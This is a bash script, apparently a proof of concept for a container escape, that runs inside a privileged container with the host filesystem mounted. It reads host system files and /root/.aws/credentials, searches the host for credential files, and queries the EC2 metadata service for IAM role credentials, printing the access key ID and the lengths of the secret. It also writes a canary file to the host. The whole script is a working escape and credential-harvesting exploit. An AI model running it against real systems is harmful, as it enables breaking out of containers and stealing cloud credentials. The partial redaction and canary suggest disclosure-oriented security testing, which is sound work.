#!/bin/bash
# Runs INSIDE the escape container spawned by ctr run --privileged.
# Host rootfs is bind-mounted at /host. No writes except /host/tmp canary.
set +e

CANARY="HOST-ESCAPE-CANARY-acab088-9F3E2B1A"

echo "=== INSIDE_ESCAPE: uname ==="
uname -a

echo "=== HOST_OS ==="
cat /host/etc/os-release 2>&1 | head
echo "--- hostname ---"
cat /host/etc/hostname 2>&1

echo "=== HOST_PID1 ==="
cat /host/proc/1/cmdline 2>&1 | tr "\0" " "; echo

echo "=== HOST_MOUNTS_HEAD ==="
head -20 /host/proc/self/mounts 2>&1

echo "=== HOST_ROOT ==="
ls /host/root 2>&1

echo "=== HOST_AWS_CREDS ==="
ls -la /host/root/.aws 2>&1
head /host/root/.aws/credentials 2>&1
head /host/root/.aws/config 2>&1

echo "=== FIND_AWS ==="
find /host -maxdepth 5 -name ".aws" 2>/dev/null | head
find /host -maxdepth 5 -name "credentials" 2>/dev/null | head

echo "=== IMDS_TOKEN ==="
TOKEN=$(curl -s --max-time 3 http://169.254.169.254/latest/api/token -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
echo "token len: ${#TOKEN}"

echo "=== IMDS_IID ==="
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document 2>&1

echo "=== IMDS_IAM_INFO ==="
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info 2>&1

echo "=== IMDS_ROLES ==="
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1

echo "=== IMDS_FIRST_ROLE (redacted) ==="
FIRST=$(curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1)
if [ -n "$FIRST" ]; then
  RAW=$(curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$FIRST")
  echo "$RAW" | python3 -c "
import sys, json
try:
  d = json.loads(sys.stdin.read())
  print('Code:', d.get('Code'))
  print('Type:', d.get('Type'))
  print('Expiration:', d.get('Expiration'))
  print('AccessKeyId:', d.get('AccessKeyId'))
  print('SecretAccessKey len:', len(d.get('SecretAccessKey','')))
  print('Token len:', len(d.get('Token','')))
except Exception as e:
  print('parse failed:', e)
" 2>&1
fi

echo "=== CANARY ==="
CP="/host/tmp/${CANARY}.txt"
echo "${CANARY} written at $(date -u +%s)" > "$CP"
ls -la "$CP"
cat "$CP"

echo "=== HOST_PROC_TOP ==="
for p in $(ls /host/proc/ | grep -E "^[0-9]+$" | sort -n | head -15); do
  cmd=$(cat /host/proc/$p/cmdline 2>/dev/null | tr "\0" " " | head -c 100)
  [ -z "$cmd" ] && cmd="(kthread/empty)"
  echo "host_pid=$p : $cmd"
done

echo "=== DONE_INSIDE ==="
